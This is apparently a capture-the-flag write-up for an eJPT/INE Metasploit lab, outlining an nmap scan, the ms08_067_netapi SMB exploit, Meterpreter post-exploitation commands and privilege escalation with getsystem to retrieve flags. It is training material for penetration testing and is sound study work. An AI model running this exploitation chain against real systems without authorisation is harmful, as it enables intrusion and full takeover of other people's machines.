# Host and Network Penetration Testing - The Metasploit Framework CTF 1 (eJPT / INE)

## Objective
Gain unauthorized access to the target system using the Metasploit Framework and perform post-exploitation to retrieve flags.

---

## Reconnaissance
- Ran a full TCP Nmap scan:
  ```bash
  nmap -sC -sV -T4 -p- <TARGET-IP>
    Discovered:

        Port 80 (HTTP)

        Port 445 (SMB)

        Other potentially exploitable services

Exploitation

    Used Metasploit's auxiliary and exploit modules to target SMB or other vulnerable services.

    Example exploit: exploit/windows/smb/ms08_067_netapi

    Established a Meterpreter session.

Post-Exploitation

    Gathered host details:

sysinfo
getuid
ipconfig

Searched for flags in user directories:

    dir C:\\Users\\<username>\\Desktop

Privilege Escalation

    Used:

getsystem

Alternatively ran local exploit suggester:

    run post/multi/recon/local_exploit_suggester

    Escalated to SYSTEM successfully.

Flags Captured

    User flag and system flag retrieved from respective desktop folders.

Tools Used

    Nmap

    Metasploit Framework

    Meterpreter

Conclusion

This lab demonstrated a classic Windows exploitation chain using Metasploit, from service enumeration to post-exploitation and privilege escalation.
